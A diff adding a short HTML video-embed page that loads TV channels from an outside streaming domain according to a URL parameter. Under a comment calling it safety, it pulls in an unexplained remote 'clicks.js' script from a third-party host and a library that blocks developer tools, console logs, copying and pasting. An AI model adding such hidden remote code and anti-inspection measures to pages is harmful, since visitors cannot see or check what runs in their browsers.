@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Dynamic Video Embed</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #000;
+    }
+    iframe {
+      width: 90%;
+      height: 90%;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <iframe id="videoPlayer" allowfullscreen></iframe>
+
+  <script>
+    // Define your channel links
+    const channels = {
+      tnt: "https://kleanpro.cfd/embed/QibeMAS7LSWitHlwOdU4ozablj8ZunO4",
+      tnt1: "https://kleanpro.cfd/embed/FrofUdRljoCLdruGUdR295IfisTlsW1w",
+      tnt2: "https://kleanpro.cfd/embed/c5phutHUkothlwRudRO8rosaS3B64ini",
+      tnt3: "https://kleanpro.cfd/embed/8esiM7BRatIQ3cAdaxes34tesIbrOpOp",
+      tnt4: "https://kleanpro.cfd/embed/SodrItO5WeQeFraDRoQa900eSw68I9LG",
+      astro: "https://kleanpro.cfd/embed/220c77f52471faf24fa6d694e69bd1b1",
+      willow: "https://kleanpro.cfd/embed/c5phutHUkothlwRudRO8rosaS3B64ini"
+     
+    };
+
+    // Get ?id= from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const channelId = urlParams.get("id");
+
+    // Set iframe src if channel exists
+    if (channelId && channels[channelId]) {
+      document.getElementById("videoPlayer").src = channels[channelId];
+    } else {
+      document.body.innerHTML = "<h2 style='color:white'>Channel not found!</h2>";
+    }
+  </script>
+  <!-- DEV-TOOLS-FOR SAFETY ⚙ -->
+<script src="https://nirutv.online/Scripts/clicks.js"></script>
+    <script disable-devtool-auto='true' src='https://cdn.jsdelivr.net/npm/disable-devtool' clear-log='true' disable-select='true' disable-copy='true' disable-cut='true' disable-paste='true'></script>
+
+</body>
+</html>
